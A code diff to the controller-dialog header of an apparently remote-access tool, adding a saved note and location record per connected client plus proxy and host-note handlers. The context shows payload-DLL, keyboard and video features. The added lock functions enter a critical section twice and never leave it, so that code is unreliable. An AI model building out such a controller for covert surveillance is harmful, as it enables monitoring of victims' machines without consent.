@@ -13,6 +13,60 @@
 // 是否在退出主控端时也退出客户端
 #define CLIENT_EXIT_WITH_SERVER 0
 
+//////////////////////////////////////////////////////////////////////////
+#include <unordered_map>
+#include <fstream>
+#define DB_FILENAME "./YAMA.db"
+
+enum {
+	MAP_NOTE,
+	MAP_LOCATION,
+};
+
+struct _ClientValue
+{
+	char Note[64];
+	char Location[64];
+	char Reserved[128]; // 预留
+	_ClientValue() {
+		memset(this, 0, sizeof(_ClientValue));
+	}
+	_ClientValue(const CString& loc, const CString& s) {
+		memset(this, 0, sizeof(_ClientValue));
+		strcpy_s(Note, s.GetString());
+		strcpy_s(Location, loc.GetString());
+	}
+	void UpdateNote(const CString& s) {
+		strcpy_s(Note, s.GetString());
+	}
+	void UpdateLocation(const CString& loc) {
+		strcpy_s(Location, loc.GetString());
+	}
+	const char* GetNote() const {
+		return Note;
+	}
+	const char* GetLocation() const {
+		return Location;
+	}
+	int GetLength() const {
+		return sizeof(_ClientValue);
+	}
+};
+
+typedef uint64_t ClientKey;
+
+typedef _ClientValue ClientValue;
+
+typedef  std::unordered_map<ClientKey, ClientValue> ComputerNoteMap;
+
+// 保存 unordered_map 到文件
+void SaveToFile(const ComputerNoteMap& data, const std::string& filename);
+
+// 从文件读取 unordered_map 数据
+void LoadFromFile(ComputerNoteMap& data, const std::string& filename);
+
+//////////////////////////////////////////////////////////////////////////
+
 enum
 {
 	PAYLOAD_DLL_X86 = 0,			// 32位 DLL
@@ -23,6 +77,43 @@ enum
 // CMy2015RemoteDlg 对话框
 class CMy2015RemoteDlg : public CDialogEx
 {
+protected:
+	ComputerNoteMap m_ClientMap;
+	CString GetClientMapData(ClientKey key, int typ) {
+		EnterCriticalSection(&m_cs);
+		auto f = m_ClientMap.find(key);
+		CString r;
+		if (f != m_ClientMap.end()) {
+			switch (typ)
+			{
+			case MAP_NOTE:
+				r = f->second.GetNote();
+				break;
+			case MAP_LOCATION:
+				r = f->second.GetLocation();
+				break;
+			default:
+				break;
+			}
+		}
+		EnterCriticalSection(&m_cs);
+		return r;
+	}
+	void SetClientMapData(ClientKey key, int typ, const char* value) {
+		EnterCriticalSection(&m_cs);
+		switch (typ)
+		{
+		case MAP_NOTE:
+			m_ClientMap[key].UpdateNote(value);
+			break;
+		case MAP_LOCATION:
+			m_ClientMap[key].UpdateLocation(value);
+			break;
+		default:
+			break;
+		}
+		EnterCriticalSection(&m_cs);
+	}
 	// 构造
 public:
 	CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent = NULL);	// 标准构造函数
@@ -48,8 +139,8 @@ public:
 
 	VOID InitControl();             //初始控件
 	VOID TestOnline();              //测试函数
-	VOID AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, 
-		CString strCPU, CString strVideo, CString strPing, CString ver, CString st, CString tp, CONTEXT_OBJECT* ContextObject);
+	VOID AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing, 
+		CString ver, CString startTime, const std::vector<std::string> &v, CONTEXT_OBJECT* ContextObject);
 	VOID ShowMessage(BOOL bOk, CString strMsg);
 	VOID CreatStatusBar();
 	VOID CreateToolBar();
@@ -79,7 +170,7 @@ public:
 	CRITICAL_SECTION m_cs;
 	BOOL       isClosed;
 	CMenu	   m_MainMenu;
-	CBitmap m_bmOnline[4];
+	CBitmap m_bmOnline[6];
 	bool CheckValid();
 	afx_msg void OnTimer(UINT_PTR nIDEvent);
 	afx_msg void OnClose();
@@ -119,10 +210,14 @@ public:
 	afx_msg LRESULT OnOpenVideoDialog(WPARAM wParam, LPARAM lParam);
 	afx_msg LRESULT OnHandleMessage(WPARAM wParam, LPARAM lParam);
 	afx_msg LRESULT OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam);
+
+	afx_msg LRESULT OnOpenProxyDialog(WPARAM wParam, LPARAM lParam);
 	afx_msg LRESULT UPXProcResult(WPARAM wParam, LPARAM lParam);
 	afx_msg BOOL OnHelpInfo(HELPINFO* pHelpInfo);
 	virtual BOOL PreTranslateMessage(MSG* pMsg);
 	afx_msg void OnOnlineShare();
 	afx_msg void OnToolAuth();
 	afx_msg void OnToolGenMaster();
+	afx_msg void OnMainProxy();
+	afx_msg void OnOnlineHostnote();
 };
